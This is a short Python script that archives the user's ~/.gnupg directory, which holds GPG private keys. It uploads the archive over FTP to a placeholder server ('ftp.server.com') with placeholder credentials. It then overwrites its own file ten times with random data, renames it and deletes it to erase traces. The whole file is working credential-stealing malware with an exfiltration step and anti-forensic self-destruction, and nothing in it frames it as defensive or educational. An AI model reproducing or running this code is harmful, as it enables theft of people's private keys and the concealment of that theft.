from secrets import token_urlsafe
import tarfile, os, ftplib, gc
from pathlib import Path
from sys import argv

# Setup paths and names:
gnu_path = "{0}/.gnupg".format(Path.home())
tarname = str(Path.home()).split("/")[-1]
tarfilepath = "{0}.tar.gz".format(tarname)

# Get data and create file:
try:
    tar = tarfile.open(tarfilepath, "w:gz")
    tar.add(gnu_path, arcname = tarname)
    tar.close()
except Exception as error:
    print(error)

# Send file:
try:
    payload = open(tarfilepath, "rb")
    session = ftplib.FTP("ftp.server.com", "username", "password")
    session.storbinary(tarname, payload)
    session.quit()
    payload.close()
except Exception as error:
    print(error)

# Autodestroy:
del gnu_path, tarname, tarfilepath
for i in range(10):
    with open(argv[0], "wb") as fl:
        fl.write(token_urlsafe(16).encode())
new_name = token_urlsafe(8)
os.rename(argv[0], new_name)
os.unlink(new_name)
gc.collect()
